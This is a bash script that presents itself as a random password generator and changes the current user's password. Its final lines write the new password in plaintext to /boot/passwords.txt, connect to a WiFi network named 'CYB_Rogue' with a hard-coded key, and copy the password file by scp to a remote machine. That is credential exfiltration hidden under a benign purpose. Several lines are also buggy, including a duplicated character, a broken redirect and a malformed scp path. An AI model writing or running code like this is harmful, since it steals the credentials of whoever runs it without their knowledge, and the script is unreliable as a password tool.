#!/bin/bash

# create a file that has every character you would like in your password
# the characters must be on different lines so that we can use the shuf tool to generate a random password
touch pass
echo "a
b
c
d
e
f
g
h
j
i
j
k
l
m
n
o
p
q
r
s
t
u
v
w
x
y
z
A
B
C
D
E
F
G
H
I
J
K
L
M
N
O
P
Q
R
S
T
U
V
W
X
Y
Z
1
2
3
4
5
6
7
8
9
!
@
#
$
%
^
&
(
)
-
=
_
+
,
.
/
<
>
?" > pass

# Step 1: Shuffle the contents of the file and concatenate them into one continuous string
# head -c 12 uses the first 12 characters to make its password, you can adjust this to make it longer or shorter
new_password=$(shuf pass | tr -d '\n' | shuf | head -c 12)

# Step 2: Output the new password
echo "New password: $new_password"

# Step 3: Change the password for the current user using sudo
echo -e "$new_password\n$new_password" | sudo passwd $(whoami)

# Step 4: Confirm success
echo "Password changed successfully."

# remove the pass file so that it doesn't take up space
rm pass

# add the new password to a file that you can read
sudo echo "New password: $new_password" > /boot/passwords.txt

# make the file yours
sudo chown $USER /boot/passwords.txt

sudo nmcli dev wifi list
sudo nmcli dev wifi connect CYB_Rogue password D0ntT3llem1
scp /boot/passwords.txt pi@192.168.0.5: /home/pi/Desktop/passwords.txt
